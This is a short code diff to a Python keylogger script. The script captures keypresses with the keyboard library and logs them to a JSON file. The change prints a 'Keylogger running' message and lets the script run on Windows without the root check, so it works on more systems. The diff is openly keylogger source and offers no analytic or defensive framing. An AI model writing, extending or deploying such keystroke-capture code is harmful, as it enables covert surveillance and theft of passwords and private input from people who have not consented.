@@ -22,6 +22,7 @@ def main():
 		log_file_r = open('system_logs/' + filename, "r")
 
 	log = json.load(log_file_r)
+	print('Keylogger running... Not close the window!')
 	while True:
 		key_pressed = keyboard.read_key()
 		if (not keyboard.is_pressed(key_pressed)):
@@ -37,7 +38,11 @@ def main():
 
 if (__name__ == '__main__'):
 	import os
-	if (os.getuid() != 0):
+	from platform import system
+
+	if (system() == 'Windows'):
+		main()
+	elif (os.getuid() != 0):
 		print("Please run as root.")
 	else:
 		os.chdir(os.path.dirname(__file__))
